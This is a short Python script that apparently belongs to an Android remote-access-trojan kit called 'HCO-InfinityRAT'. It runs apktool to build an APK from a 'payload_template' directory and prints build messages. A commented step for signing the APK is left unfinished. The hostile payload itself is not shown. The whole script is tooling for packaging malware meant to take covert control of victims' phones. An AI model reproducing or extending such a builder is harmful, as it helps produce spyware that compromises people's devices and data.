import os
import shutil

print("[+] Building HCO-InfinityRAT APK...")

# Define input/output
apktool_cmd = "apktool b payload_template -o output/HCO-InfinityRAT.apk"
signed_apk = "output/HCO-InfinityRAT-signed.apk"

# Run Apktool build
os.system(apktool_cmd)

# Optional: Sign the APK (requires keystore setup)
print("[+] APK built successfully at: output/HCO-InfinityRAT.apk")
